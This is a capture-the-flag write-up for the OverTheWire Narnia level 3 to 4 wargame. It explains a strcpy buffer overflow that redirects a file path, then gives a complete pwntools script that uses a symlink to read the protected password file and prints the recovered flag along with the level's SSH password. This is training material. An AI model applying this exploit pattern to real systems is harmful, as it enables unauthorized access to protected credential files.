## 3 -> 4

### Writeup

In the source code we can see that the program uses `strcpy` to read into a 32 byte buffer that is defined right after a 16 byte buffer containing `/dev/null`. Since `strcpy` doesn’t enforce bounds on how many bytes is being read, this means that the program is vulnerable to buffer overflow. With this vulnerability, we can direct the stream from writing bytes into `/dev/null`, into whatever file we want, allowing us to read the contents of `/etc/narnia_pass/narnia4`.

To do this we need to make two files. 
1. Where we want the flag to be read to eg: `/tmp/0/a`. 
2. Symbollic link to `/etc/narnia_pass/narnia4`

2 is more tricky. We need to include `/tmp/0/a` at the end of our name and be long enough that to overflow the first file path into the second buffer eg: `/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/0/a`

With those two files the two buffers look like this:
```
ofile[“/tmp/0/a”] (this is where the program writes to)
ifile[“/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA”] (this is where the program writes from)
```

We then feed the second file name to the program to get the flag.

<details>
  <summary>Flag</summary>CyWyf6uGWQ
</details>

### Script


```python
#! /bin/env python3
from pwn import *;
print(f"[\033[95m\033[1m*\033[0m] \033[95m\033[1mSTARTING EXPLOIT\033[0m")
context.arch = "i386"
context.log_level = "info"
link = ssh(    
	host = "narnia.labs.overthewire.org",
	port = 2226, 
	user = "narnia3",    
	password = "F5AYQwE8PA"
)
r = link.run("/bin/sh") 

r.sendline(b"mkdir -p /tmp/$(python3 -c 'print(\"A\" * 27)')/tmp/0")
r.sendline(b"mkdir -p /tmp/0")
r.sendline(b"ln -sf /etc/narnia_pass/narnia4 /tmp/$(python3 -c 'print(\"A\" * 27)')/tmp/0/a")
r.sendline(b"touch /tmp/0/a")
r.sendline(b"chmod 777 /tmp/0/a")
r.sendline(b"chmod 777 /tmp/$(python3 -c 'print(\"A\" * 27)')/tmp/0/a")
r.sendline(b"/narnia/narnia3 /tmp/$(python3 -c 'print(\"A\" * 27)')/tmp/0/a")

r.recvuntil(b"\n")
r.sendline(b"cat /tmp/0/a")
r.recvuntil(b"\n")

flag = r.recvuntil(b"\n").decode().strip("\n").strip("$ ")
print(f"[\033[92m*\033[0m] flag: \033[105m\033[97m{flag}\033[0m")

```